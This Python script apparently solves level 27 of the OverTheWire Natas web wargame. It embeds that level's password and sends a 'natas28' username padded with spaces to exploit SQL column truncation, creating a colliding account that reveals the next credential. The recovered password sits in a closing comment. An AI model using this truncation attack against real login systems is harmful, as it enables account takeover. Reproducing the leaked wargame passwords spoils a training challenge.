import requests

level = str(27)
pw = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"

url = "http://natas"+level+".natas.labs.overthewire.org/index.php"


s = requests.Session()
s.auth = ('natas'+level, pw)

payload = "natas28"+65*" "+"X"
params = (("username", payload), ("password", "1234"))
r = s.get(url, params=params)

print(r.text)

params = (("username", "natas28"), ("password", "1234"))
r = s.get(url, params=params)

print(r.text)

# JWwR438wkgTsNKBbcJoowyysdM82YjeF